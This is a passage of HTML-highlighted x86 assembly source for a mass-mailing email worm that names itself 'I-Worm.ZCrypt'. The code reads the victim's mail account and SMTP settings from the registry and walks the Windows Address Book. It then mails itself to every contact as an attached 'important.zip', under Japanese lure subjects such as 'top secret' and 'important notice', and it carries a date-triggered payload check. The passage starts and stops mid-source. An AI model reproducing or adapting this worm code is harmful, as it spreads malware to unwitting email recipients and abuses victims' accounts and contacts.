</span><span class="sc5">len_smtp_MIME_exe</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_MIME_exe</span><span class="sc0">

</span><span class="sc5">smtp_MIME_zip</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'--Boundary-fuck'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Type: application/zip; name="important.zip"'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Disposition: attachment;  filename="important.zip"'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Content-Transfer-Encoding: BASE64'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_MIME_zip</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_MIME_zip</span><span class="sc0">

    </span><span class="sc1">;;  base64 body</span><span class="sc0">
</span><span class="sc5">smtp_MIME_e</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc12">'--Boundary-fuck--'</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_MIME_e</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_MIME_e</span><span class="sc0">



</span><span class="sc5">smtp_jsubject_1</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CRLF</span><span class="sc4">,</span><span class="sc12">'SUBJECT: =?ISO-2022-JP?B?'</span><span class="sc0">
</span><span class="sc5">len_smtp_jsubject_1</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_jsubject_1</span><span class="sc0">
</span><span class="sc5">smtp_jsubject_2</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'?='</span><span class="sc4">,</span><span class="sc5">CRLF</span><span class="sc0">
</span><span class="sc5">len_smtp_jsubject_2</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">smtp_jsubject_2</span><span class="sc0">


</span><span class="sc1">;;;  japanese subjects table</span><span class="sc0">
</span><span class="sc5">japanese_subjects</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_01</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_02</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_03</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_04</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_05</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_06</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_07</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">js_08</span><span class="sc0">
</span><span class="sc5">num_of_jsub</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">japanese_subjects</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">

    </span><span class="sc1">; 重要</span><span class="sc0">
</span><span class="sc5">js_01</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCPUVNVxsoQg=='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; Re:重要</span><span class="sc0">
</span><span class="sc5">js_02</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'UmU6GyRCPUVNVxsoQg=='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; ウソコ</span><span class="sc0">
</span><span class="sc5">js_03</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCJSYlPSUzGyhC'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; うんこ</span><span class="sc0">
</span><span class="sc5">js_04</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCJCYkcyQzGyhC'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; 大事なお知らせ</span><span class="sc0">
</span><span class="sc5">js_05</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCQmc7diRKJCpDTiRpJDsbKEI='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; 極秘</span><span class="sc0">
</span><span class="sc5">js_06</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCNktIaxsoQg=='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; Re:極秘</span><span class="sc0">
</span><span class="sc5">js_07</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'UmU6GyRCNktIaxsoQg=='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; おもしろいものをみつけました</span><span class="sc0">
</span><span class="sc5">js_08</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'GyRCJCokYiQ3JG0kJCRiJE4kciRfJEQkMSReJDckPxsoQg=='</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;;;  payload</span><span class="sc0">
</span><span class="sc5">dcontext</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">count</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">x_system</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">y_system</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">wav.inc</span><span class="sc0">

    </span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">260</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">thisfilename</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">exit1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">setup_seh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'I-Worm.ZCrypt'</span><span class="sc0">
</span><span class="sc5">setup_seh</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  setup seh</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">exit</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetTickCount</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">r_seed</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">;  initialize random seed</span><span class="sc0">


    </span><span class="sc1">;;  payload time?</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">GetLocalTime</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">buffer</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">payload</span><span class="sc0">
    
</span><span class="sc5">go</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">enc_zip_start</span><span class="sc0">
    
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_base64enc</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0101h</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">WSAStartup</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">

    
</span><span class="sc5">ms_stuff</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">bufsiz_accountidx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">AccountIdx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">str_DMA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">str_SMInternetAccountManager</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_reg</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">release_wsa</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">bufsiz_SMTPSERVER</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">SMTP_Server</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">str_SMTPNAME</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">str_SMIAccounts</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_reg</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">release_wsa</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">bufsiz_morons_mailaddr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">morons_Mailaddr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">str_SMTPEmailAddr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">str_SMIAccounts</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_reg</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">release_wsa</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">bufsiz_wab4_path</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">wab4_path</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">str_SMWab4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_reg</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">release_wsa</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_wab</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@close_wab</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ms_spread</span><span class="sc0">

    </span><span class="sc5">@@close_wab</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_mapped_file</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">release_wsa</span><span class="sc0">
    

</span><span class="sc5">release_wsa</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">WSACleanup</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">

</span><span class="sc1">;;;  ------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">ms_spread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  lifewire ;)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">hmmapview</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">64h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;  num of addr</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">@@exit</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">60h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;  ptr to addr</span><span class="sc0">

    </span><span class="sc5">@@spread_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@nounicode</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">target_mailaddr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">48h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@1</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">

    </span><span class="sc5">@@nounicode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">general_spread</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">24h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@@spread_loop</span><span class="sc0">
    
    </span><span class="sc5">@@exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
    
</span><span class="sc5">general_spread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">;;  in</span><span class="sc0">
    </span><span class="sc1">;;   eax = mail addr</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;  esi = index</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;  now esi=email addr</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">socket</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sock</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sin_family</span><span class="sc4">],</span><span class="sc5">AF_INET</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">25</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sin_port</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">SMTP_Server</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">gethostbyname</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">@@exit</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sin_addr</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">len_sockaddr_in</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">sockaddr_in</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sock</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">connect</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@exit</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sendmail</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">sock</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">closesocket</span><span class="sc0">
    </span><span class="sc5">@@exit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;;;  -------------------------------------------------</span><span class="sc0">
</span><span class="sc5">sendmail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;  mail addr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">jflag</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">;  flag for ".jp"</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_recv</span><span class="sc0">

    </span><span class="sc1">;;  HELO</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_HELO</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_HELO</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_recv</span><span class="sc0">

    </span><span class="sc1">;;  MAIL FROM</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_MAIL_FROM</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_MAIL_FROM</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">morons_Mailaddr</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">morons_Mailaddr</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_crlf</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_recv</span><span class="sc0">

    </span><span class="sc1">;;  RCPT TO</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">len_smtp_RCPT_TO</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_RCPT_TO</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">         </span><span class="sc1">;  mail addr</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">callW</span><span class="sc0">   </span><span class="sc5">lstrlen</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;  save len</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">smtp_crlf</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_send</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">g_recv</span><span class="sc0">

    </span><span class="sc1">;;  ".jp"</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;  len of mail address</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
